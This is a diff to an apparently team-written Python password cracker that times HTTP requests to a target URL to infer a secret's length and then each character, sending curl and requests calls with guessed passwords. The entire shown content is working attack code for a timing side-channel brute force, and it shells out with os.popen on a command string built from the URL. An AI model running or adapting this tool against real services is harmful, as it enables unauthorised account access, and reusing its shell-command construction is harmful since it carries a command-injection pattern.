@@ -1,4 +1,5 @@
 import os
+import string
 import sys
 import scipy.stats as st
 import requests
@@ -124,21 +125,23 @@ def run_url(url: str, logger=None) -> float:
     """
     try:
         # aviv
-        # urllib.request.urlopen(url)
+        start = time()
+        requests.get(url[9:len(url) - 1])
+        time_pass = time() - start
 
         # yarden
-        command = url
-        #start = time()
+        # command = url
+        # start = time()
         # os.system(command + ">/dev/null 2>&1")
-        #subprocess.check_output(command, shell=True)
+        # subprocess.check_output(command, shell=True)
         # os.system(url)
-        #time_pass = time() - start
+        # time_pass = time() - start
 
         # adir
-        url = url[url.find("\"") + 1:url.rfind("\"")]
-
-        response = REQUESTS_SESSION.get(url)
-        time_pass = response.elapsed.total_seconds()
+        # url = url[url.find("\"") + 1:url.rfind("\"")]
+        # timer.sleep(1)
+        # response = REQUESTS_SESSION.get(url)
+        # time_pass = response.elapsed.total_seconds()
 
 
     except Exception as e:
@@ -162,22 +165,11 @@ def check_password_size_thread(url_result_command: str, iterations: int, thread_
 
     :return: Float. Sum all the requests time.
     """
-    total_iterations_time = 0
 
-    for i in range(iterations):
-        # yarden
-        res_time = run_url(url_result_command)
+    res_time = run_url(url_result_command)
+    write_log(logger, message=f"[check password size thread][length {thread_number}]: result: {res_time}:")
 
-        # aviv
-        # res = os.popen(url_time_command).read()
-        # res_time = float(res)
-
-        # sum iterations time
-        total_iterations_time += res_time
-
-    write_log(logger, message=f"[check password size thread][length {thread_number}]: result: {total_iterations_time}:")
-
-    return total_iterations_time
+    return res_time
 
 
 def warmup() -> None:
@@ -239,9 +231,10 @@ def _get_url_params(start_url: str, end_url: str, password_length: int, password
     url = f'{start_url}{password}{end_url}'
 
     url_result_command = f'curl -s "{url}"'
-    url_time_command = 'curl -s -w "%{{time_total}}" "{start_url}{password}{end_url}\"'.format(
-        time_total='time_total', start_url=start_url, password=Configurations.default_character * password_length,
-        end_url=end_url)
+    url_time_command = f'curl -s "{url}"'
+    # url_time_command = 'curl -s -w "%{{time_total}}" "{start_url}{password}{end_url}\"'.format(
+    #     time_total='time_total', start_url=start_url, password=Configurations.default_character * password_length,
+    #     end_url=end_url)
 
 
     return url_time_command, url_result_command, url, password
@@ -331,26 +324,24 @@ def check_password_size(start_url: str = "", end_url: str = "", max_password_siz
     distinct = False
     attempts = 0
 
-    # creating list of lists of all possible password sizes
-    # minimal_results_attempts_list = [sys.maxsize for _ in range(Configurations.default_password_size + 1)]
+    # list of lists. represent in each cell a list of all the attempts for a given password length
+    all_results_attempts_list = [[] for _ in range(Configurations.default_password_size + 1)]
 
-    while not distinct and attempts < Configurations.max_password_size_attempt:  # if result not distinct and attempt didnt reach to maximun according to configuration setup
+    for _ in range(Configurations.max_password_size_attempt):  # if attempt didnt reach to maximun according to configuration setup
+        Configurations.current_attempt += 1
         results_dict = _check_password_size(start_url, end_url, max_password_size, logger)
 
-        # add the time results of the current iteration attempt for each password length
-        # for i in range(len(minimal_results_attempts_list)):
-        #     if minimal_results_attempts_list[i] > results_dict[i]:
-        #         minimal_results_attempts_list[i] = results_dict[i]
+        for i in range(Configurations.default_password_size):
+            all_results_attempts_list[i].append(results_dict[i])
 
-        # check timing results
-        results_list_without_chosen_char, chosen_char = _get_chosen_char(results_dict)
 
-        # check distinct
-        distinct = check_if_distinct(results_list_without_chosen_char, Configurations.number_alpha)
+    chosen_result_all_password_size = {}
+    for i in range(Configurations.default_password_size):
+        chosen_result_all_password_size[i] = min(all_results_attempts_list[i])
 
-        attempts = attempts + 1
-
-    return chosen_char
+    chosen_password_size = max(chosen_result_all_password_size, key=chosen_result_all_password_size.get)
+    print(chosen_password_size)
+    return chosen_password_size
 
 
 def crack_password_thread(url_time_command, url_result_command, ch, current_password, iterations: int=1, logger=None) -> float:
@@ -367,31 +358,25 @@ def crack_password_thread(url_time_command, url_result_command, ch, current_pass
     """
     total_iterations_time = 0
 
-    for i in range(iterations):
-        if len(Configurations.password) != 0:
-            break
-        elif Configurations.default_character not in current_password:  # final character
-            res = os.popen(url_time_command).read()
-            if res == '1':
-                Configurations.password = current_password
-                write_log(logger, f"[crack password thread] Password is: {current_password}")
-
-            write_log(logger, f"[crack password thread] Password is NOT: {current_password}")
-
-            return 0.0
+    if Configurations.default_character not in current_password:  # final character
+        res = os.popen(url_time_command).read()
+        if res == '1':
+            Configurations.password = current_password
+            write_log(logger, f"[crack password thread] Password is: {current_password}")
 
         else:
-            # yarden
-            res_time = run_url(url_result_command)
+            write_log(logger, f"[crack password thread] Password is NOT: {current_password}")
 
-            # aviv
-            # res = os.popen(url_time_command, ).read()
-            # res_time = float(res)
+        return 0.0
 
-            total_iterations_time += res_time
+    else:
 
-            if i + 1 == iterations:
-                write_log(logger, f"[crack password thread][{ch}][iteration {i}] result time: {total_iterations_time}  -  {url_result_command}")
+        res_time = run_url(url_result_command)
+
+        total_iterations_time += res_time
+
+        # if i + 1 == iterations:
+        write_log(logger, f"[crack password thread][{ch}][iteration {Configurations.current_attempt}] result time: {total_iterations_time}  -  {url_result_command}")
 
     return total_iterations_time
 
@@ -504,6 +489,7 @@ def crack_password(password_size: int, start_url: str = "", end_url: str = "", l
     # for i in range(password_size - len(password)):  # iterate all password by length
     for i in range(password_size):  # iterate all password by length
 
+
         # if i == password_size - len(password):  # last iteration
         if len(password) + 1 == password_size:  # last iteration
             _check_last_char(start_url, end_url, password, password_size, logger)
@@ -511,17 +497,31 @@ def crack_password(password_size: int, start_url: str = "", end_url: str = "", l
             return Configurations.password
 
         else:  # try all character to fit the next step of the password
-            distinct = False
 
-            while not distinct:  # not distinct, need to run this again
+            Configurations.current_attempt = 0
+            # list of lists. represent in each cell a list of all the attempts for the given a char
+            all_results_attempts_list = [[] for _ in range(len(string.ascii_lowercase))]
+
+            # run each password the amount of time of attempts we configured
+            for _ in range(Configurations.attempts):
+
+                Configurations.current_attempt += 1
                 results_dict = _crack_password_step(start_url, end_url, password, password_size, logger)
 
-                results_list_without_chosen_char, chosen_char = _get_chosen_char(results_dict)
+                for index, ch in zip(range(len(Configurations.letters_lower)), Configurations.letters_lower):
+                    all_results_attempts_list[index].append(results_dict[ch])
 
-                # check distinct
-                distinct = check_if_distinct(results_list_without_chosen_char, Configurations.letter_alpha)
+        # a dictionary that will contain for each char the minimal run time
+        chosen_result_all_letters = {}
 
-            password += chosen_char
+        # get from all the attempts for each char his lowest run time
+        for index, ch in zip(range(len(Configurations.letters_lower)), Configurations.letters_lower):
+            chosen_result_all_letters[ch] = min(all_results_attempts_list[index])
+
+        # get the char with the highest run time
+        chosen_char = max(chosen_result_all_letters, key=chosen_result_all_letters.get)
+
+        password += chosen_char
 
     return Configurations.password if Configurations.password != "" else None
 
